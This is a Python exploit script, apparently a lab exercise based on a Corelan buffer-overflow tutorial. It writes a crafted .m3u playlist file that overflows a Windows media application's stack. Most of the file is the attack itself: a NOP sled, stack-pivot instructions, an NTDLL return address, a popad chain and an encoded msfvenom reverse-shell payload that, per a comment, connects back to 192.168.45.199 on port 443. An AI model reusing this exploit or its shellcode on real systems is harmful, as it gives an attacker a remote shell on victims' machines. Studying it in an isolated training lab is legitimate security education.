#!/usr/bin/python3

# https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
# here we have disabled ASLR system wide (to give reliable gadgets)

# note: this example is very constructed / unrealistic

from struct import pack
import pwn
import sys

size = 27000

buf = b""

offEip = pwn.cyclic_find(0x6177636b)            # 26086
# buf += pwn.cyclic(size)

offEspInbuf = 0x394                             # somehow above esp a part of the beginning of inbuf appears again
buf += b"\x90" * offEspInbuf                    # nopsled

offEsp = 0x88ec                                 # offset from inbuf to ESP at EIP overwrite
buf += pwn.asm(f"add esp, -{offEsp}")           # begin again of input buffer
buf += pwn.asm(f"jmp esp")

buf += b"\x90" * 0x20                           # nopsled

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=443 -e x86/alpha_upper -b "\x00" -f python -v buf
# buf += b"\xcc" * 8                              # int3
buf += b"\x89\xe3\xd9\xe1\xd9\x73\xf4\x5e\x56\x59\x49\x49"
buf += b"\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
buf += b"\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
buf += b"\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
buf += b"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58\x4c"
buf += b"\x42\x35\x50\x33\x30\x45\x50\x55\x30\x4d\x59\x4d"
buf += b"\x35\x36\x51\x39\x50\x55\x34\x4c\x4b\x56\x30\x46"
buf += b"\x50\x4c\x4b\x50\x52\x44\x4c\x4c\x4b\x31\x42\x55"
buf += b"\x44\x4c\x4b\x52\x52\x46\x48\x44\x4f\x4e\x57\x51"
buf += b"\x5a\x36\x46\x36\x51\x4b\x4f\x4e\x4c\x47\x4c\x55"
buf += b"\x31\x33\x4c\x44\x42\x56\x4c\x57\x50\x39\x51\x38"
buf += b"\x4f\x34\x4d\x53\x31\x4f\x37\x4b\x52\x4a\x52\x46"
buf += b"\x32\x31\x47\x4c\x4b\x36\x32\x32\x30\x4c\x4b\x31"
buf += b"\x5a\x37\x4c\x4c\x4b\x50\x4c\x44\x51\x33\x48\x4b"
buf += b"\x53\x47\x38\x35\x51\x4e\x31\x36\x31\x4c\x4b\x30"
buf += b"\x59\x57\x50\x45\x51\x39\x43\x4c\x4b\x30\x49\x35"
buf += b"\x48\x4b\x53\x47\x4a\x50\x49\x4c\x4b\x30\x34\x4c"
buf += b"\x4b\x43\x31\x48\x56\x56\x51\x4b\x4f\x4e\x4c\x39"
buf += b"\x51\x38\x4f\x44\x4d\x35\x51\x58\x47\x57\x48\x4d"
buf += b"\x30\x33\x45\x4b\x46\x34\x43\x33\x4d\x4c\x38\x37"
buf += b"\x4b\x33\x4d\x51\x34\x53\x45\x5a\x44\x50\x58\x4c"
buf += b"\x4b\x30\x58\x47\x54\x55\x51\x39\x43\x35\x36\x4c"
buf += b"\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x58\x45\x4c\x35"
buf += b"\x51\x38\x53\x4c\x4b\x55\x54\x4c\x4b\x33\x31\x58"
buf += b"\x50\x4c\x49\x30\x44\x47\x54\x31\x34\x31\x4b\x51"
buf += b"\x4b\x45\x31\x36\x39\x50\x5a\x30\x51\x4b\x4f\x4b"
buf += b"\x50\x51\x4f\x51\x4f\x50\x5a\x4c\x4b\x45\x42\x4a"
buf += b"\x4b\x4c\x4d\x51\x4d\x32\x48\x46\x53\x36\x52\x55"
buf += b"\x50\x35\x50\x43\x58\x54\x37\x53\x43\x57\x42\x31"
buf += b"\x4f\x46\x34\x55\x38\x50\x4c\x34\x37\x36\x46\x53"
buf += b"\x37\x4b\x4f\x48\x55\x4e\x58\x4a\x30\x53\x31\x45"
buf += b"\x50\x43\x30\x46\x49\x4f\x34\x51\x44\x56\x30\x43"
buf += b"\x58\x47\x59\x4b\x30\x52\x4b\x45\x50\x4b\x4f\x59"
buf += b"\x45\x56\x30\x36\x30\x30\x50\x50\x50\x57\x30\x30"
buf += b"\x50\x57\x30\x56\x30\x53\x58\x4b\x5a\x54\x4f\x59"
buf += b"\x4f\x4b\x50\x4b\x4f\x49\x45\x5a\x37\x32\x4a\x35"
buf += b"\x55\x35\x38\x39\x50\x49\x38\x46\x4d\x4f\x37\x52"
buf += b"\x48\x33\x32\x35\x50\x43\x31\x4f\x4b\x4d\x59\x5a"
buf += b"\x46\x53\x5a\x32\x30\x30\x56\x31\x47\x45\x38\x4a"
buf += b"\x39\x39\x35\x44\x34\x53\x51\x4b\x4f\x49\x45\x4c"
buf += b"\x45\x39\x50\x44\x34\x54\x4c\x4b\x4f\x50\x4e\x33"
buf += b"\x38\x52\x55\x4a\x4c\x55\x38\x4a\x50\x4f\x45\x49"
buf += b"\x32\x50\x56\x4b\x4f\x49\x45\x52\x48\x35\x33\x42"
buf += b"\x4d\x43\x54\x55\x50\x4c\x49\x4a\x43\x50\x57\x50"
buf += b"\x57\x51\x47\x36\x51\x4c\x36\x53\x5a\x34\x52\x31"
buf += b"\x49\x36\x36\x4b\x52\x4b\x4d\x33\x56\x4f\x37\x37"
buf += b"\x34\x46\x44\x57\x4c\x43\x31\x43\x31\x4c\x4d\x57"
buf += b"\x34\x47\x54\x34\x50\x39\x56\x33\x30\x50\x44\x30"
buf += b"\x54\x36\x30\x36\x36\x50\x56\x56\x36\x57\x36\x51"
buf += b"\x46\x50\x4e\x46\x36\x46\x36\x36\x33\x36\x36\x33"
buf += b"\x58\x32\x59\x58\x4c\x37\x4f\x4b\x36\x4b\x4f\x59"
buf += b"\x45\x4c\x49\x4d\x30\x50\x4e\x50\x56\x51\x56\x4b"
buf += b"\x4f\x36\x50\x55\x38\x34\x48\x4d\x57\x35\x4d\x35"
buf += b"\x30\x4b\x4f\x59\x45\x4f\x4b\x5a\x50\x48\x35\x4e"
buf += b"\x42\x46\x36\x42\x48\x39\x36\x4a\x35\x4f\x4d\x4d"
buf += b"\x4d\x4b\x4f\x4e\x35\x37\x4c\x54\x46\x53\x4c\x55"
buf += b"\x5a\x4d\x50\x4b\x4b\x4b\x50\x33\x45\x44\x45\x4f"
buf += b"\x4b\x51\x57\x45\x43\x42\x52\x52\x4f\x33\x5a\x55"
buf += b"\x50\x46\x33\x4b\x4f\x58\x55\x41\x41"

buf += b"\x41" * (offEip - len(buf))            # next DWORD overwrites EIP
# buf += pwn.cyclic(offEip-len(buf))

buf += pack("<I", 0x77da9928)                   # push esp ; ret: s -b 77da0000 77f30000 54 c3 (NTDLL)

offEspAlign = 4
buf += b"\x43" * offEspAlign                    # align ESP to begin of shellcode

bytePopad = 32                                  # each popad takes 32 byte from the stack
nPopad = (offEspInbuf + bytePopad-1)//bytePopad # jump to beginning of buffer where the next stage of shellcode lies
buf += pwn.asm("popad") * nPopad                # \x61
buf += pwn.asm("jmp esp")                       # \xff\xe4

lenGarbage = 100
buf += b"\x44" * lenGarbage                     # simulate some junk on the stack that we have to skip

buf += b"Z" * (size-len(buf))

assert len(buf) == size

badchars = b"\x00"
for b in badchars:
    assert b not in buf

with open(sys.argv[0].replace(".py", ".m3u"), "wb") as f:
    f.write(buf)
